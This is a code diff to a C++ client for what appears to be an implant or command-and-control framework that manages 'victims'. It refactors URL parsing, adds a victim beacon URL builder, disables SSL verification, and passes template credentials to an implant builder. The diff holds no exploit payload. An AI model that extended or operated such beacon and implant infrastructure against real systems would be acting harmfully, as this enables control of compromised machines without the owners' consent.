@@ -11,6 +11,7 @@
 #include "Types.hpp"
 #include "VictimManager.hpp"
 #include "VictimTemplateDAO.hpp"
+#include <UrlUtils.hpp>
 #include <print>
 #include <stdexcept>
 
@@ -74,29 +75,20 @@ std::string Client::getServerUrl() const noexcept {
 //
 //-------------------------------------------------
 std::string Client::getServerHost() const noexcept {
-    const auto server_url = getServerUrl();
+    return extract_url_host(getServerUrl());
+}
 
-    std::string_view host = server_url;
-
-    // 1. Remove the scheme (e.g., "https://")
-    const auto scheme_end = host.find("://");
-    if (scheme_end != std::string_view::npos) {
-        host.remove_prefix(scheme_end + 3);
+//-------------------------------------------------
+//
+//-------------------------------------------------
+std::string Client::getVictimBeaconUrl() const noexcept {
+    if (m_config.has(Key::client_implant_url_key)) {
+        return m_builder.getServerURL();
     }
 
-    // 2. Remove the path and query (anything after the first '/')
-    const auto path_start = host.find('/');
-    if (path_start != std::string_view::npos) {
-        host = host.substr(0, path_start);
-    }
-
-    // 3. Remove the port (anything after the first ':')
-    const auto port_start = host.find(':');
-    if (port_start != std::string_view::npos) {
-        host = host.substr(0, port_start);
-    }
-
-    return std::string(host);
+    const auto victim_port = static_cast<uint16_t>(
+        m_config.get<int>(Key::client_victim_api_port_key, 3000));
+    return normalize_victim_beacon_url(getServerUrl(), victim_port);
 }
 
 //-------------------------------------------------
@@ -131,12 +123,9 @@ void Client::setServerUrl(const std::string& server_url) noexcept {
     conf.verbose = false;
     conf.verify_ssl = false;
 
-    if (server_url.ends_with("/")) {
-        m_rest_client = cpppwn::RESTClient(server_url.substr(server_url.size() - 2), conf);
-    } else {
-        m_rest_client = cpppwn::RESTClient(server_url, conf);
-    }
-    m_config.set(Key::client_server_url_key, server_url);
+    const auto normalized_url = strip_trailing_slash(server_url);
+    m_rest_client = cpppwn::RESTClient(normalized_url, conf);
+    m_config.set(Key::client_server_url_key, normalized_url);
     updateStatusText();
 }
 
@@ -292,11 +281,18 @@ const std::vector<Victim>& Client::getVictims() const noexcept {
     m_rest_client.set_auth_basic(getUsername(), getPassword());
 
     try{
-        VictimTemplateDAO vic_temp;
-        vic_temp.username = username;
-        vic_temp.password = password;
+        VictimTemplateCreateRequest request;
+        request.username = username;
+        request.password = password;
 
-        const auto& temp = m_rest_client.post<VictimTemplateDAO>("api/templates", vic_temp);
+        const auto temp = m_rest_client.post<VictimTemplateCreateRequest, VictimTemplateCreatedResponse>(
+            "api/templates",
+            request);
+
+        if (temp.id > 0) {
+            m_builder.setUsername(username);
+            m_builder.setPassword(temp.password_credential);
+        }
 
         return temp.id > 0;
     } catch(const std::runtime_error& err) {
